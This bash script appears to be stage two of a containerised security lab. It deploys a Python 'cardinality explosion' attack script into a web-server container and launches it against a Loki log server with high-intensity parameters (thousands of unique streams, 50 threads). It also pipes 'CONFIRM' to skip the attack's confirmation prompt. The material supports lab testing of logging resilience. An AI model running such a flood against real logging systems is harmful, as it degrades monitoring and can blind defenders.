#!/bin/bash

# ==========================================================================
# STAGE 02: Cardinality Explosion Attack
# ==========================================================================
# Launches the Loki cardinality attack in high-intensity mode.
# Creates thousands of unique streams to stress the index.
# ==========================================================================

set -e

# --- Configuration ---
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ATTACKS_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"

WEBSERVER_CONTAINER="clab-security_lab-web_server"
SIEM_CONTAINER="clab-security_lab-siem"

# Loki target
LOKI_HOST="10.10.30.2"
LOKI_PORT="3100"

# Attack script
ATTACK_SCRIPT="${ATTACKS_DIR}/python-scripts/loki_cardinality_attack.py"
ATTACK_SCRIPT_CONTAINER="/tmp/loki_cardinality_attack.py"

# Attack parameters - HIGH INTENSITY
ATTACK_MODE="cardinality"
NUM_ENTRIES=10000
NUM_THREADS=50
UNIQUE_PER_BATCH=100
BATCH_SIZE=100

# Output file
ATTACK_LOG="${SCRIPT_DIR}/attack_output.log"

# --- Colors ---
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
CYAN="\033[0;36m"
MAGENTA="\033[0;35m"
NC="\033[0m"

# --- Functions ---
log_stage() {
    echo ""
    echo -e "${RED}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  STAGE 02: CARDINALITY EXPLOSION ATTACK                          ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

log_info() {
    echo -e "[$(date '+%H:%M:%S')] ${CYAN}[INFO]${NC} $1"
}

log_attack() {
    echo -e "[$(date '+%H:%M:%S')] ${RED}[ATTACK]${NC} $1"
}

log_success() {
    echo -e "[$(date '+%H:%M:%S')] ${GREEN}[OK]${NC} $1"
}

log_error() {
    echo -e "[$(date '+%H:%M:%S')] ${RED}[ERROR]${NC} $1"
}

# --- Main ---
main() {
    log_stage
    
    local start_time=$(date +%s)
    
    # Verify attack script exists
    if [ ! -f "$ATTACK_SCRIPT" ]; then
        log_error "Attack script not found: ${ATTACK_SCRIPT}"
        exit 1
    fi
    
    # Copy attack script to container
    log_info "Deploying attack script to trusted endpoint..."
    docker cp "$ATTACK_SCRIPT" "${WEBSERVER_CONTAINER}:${ATTACK_SCRIPT_CONTAINER}"
    log_success "Attack script deployed"
    
    # Ensure requests library is available
    log_info "Verifying Python dependencies..."
    docker exec "$WEBSERVER_CONTAINER" pip3 install -q requests 2>/dev/null || true
    
    # Display attack parameters
    echo ""
    echo -e "${RED}┌─────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${RED}│              ATTACK PARAMETERS (HIGH INTENSITY)                 │${NC}"
    echo -e "${RED}├─────────────────────────────────────────────────────────────────┤${NC}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Target:" "${LOKI_HOST}:${LOKI_PORT}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Attack Mode:" "${ATTACK_MODE}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Total Entries:" "${NUM_ENTRIES}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Parallel Threads:" "${NUM_THREADS}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Unique Streams/Batch:" "${UNIQUE_PER_BATCH}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Batch Size:" "${BATCH_SIZE}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Expected Streams:" "~$((NUM_ENTRIES / BATCH_SIZE * UNIQUE_PER_BATCH))"
    echo -e "${RED}└─────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    
    log_attack "Launching cardinality explosion attack..."
    echo ""
    
    # Build attack command
    local attack_cmd="python3 ${ATTACK_SCRIPT_CONTAINER} \
        --host ${LOKI_HOST} \
        --port ${LOKI_PORT} \
        -m ${ATTACK_MODE} \
        -n ${NUM_ENTRIES} \
        -t ${NUM_THREADS} \
        -u ${UNIQUE_PER_BATCH} \
        -b ${BATCH_SIZE}"
    
    # Execute attack (with auto-confirmation for cardinality mode)
    # We pipe 'CONFIRM' to auto-accept the confirmation prompt
    echo "CONFIRM" | docker exec -i "$WEBSERVER_CONTAINER" bash -c "$attack_cmd" 2>&1 | tee "$ATTACK_LOG"
    
    local attack_exit_code=${PIPESTATUS[1]}
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    
    echo ""
    
    if [ $attack_exit_code -eq 0 ]; then
        log_success "Attack completed successfully in ${duration} seconds"
    else
        log_error "Attack failed with exit code ${attack_exit_code}"
        exit 1
    fi
    
    # Save attack metadata
    cat >> "$ATTACK_LOG" << EOF

# Attack Metadata
ATTACK_DURATION_SECONDS=${duration}
ATTACK_MODE=${ATTACK_MODE}
ATTACK_ENTRIES=${NUM_ENTRIES}
ATTACK_THREADS=${NUM_THREADS}
ATTACK_UNIQUE_PER_BATCH=${UNIQUE_PER_BATCH}
EOF
    
    log_info "Attack log saved to: ${ATTACK_LOG}"
    echo ""
    
    # Brief pause to let Loki process the data
    log_info "Allowing 5 seconds for Loki to process ingested data..."
    sleep 5
    
    exit 0
}

main "$@"
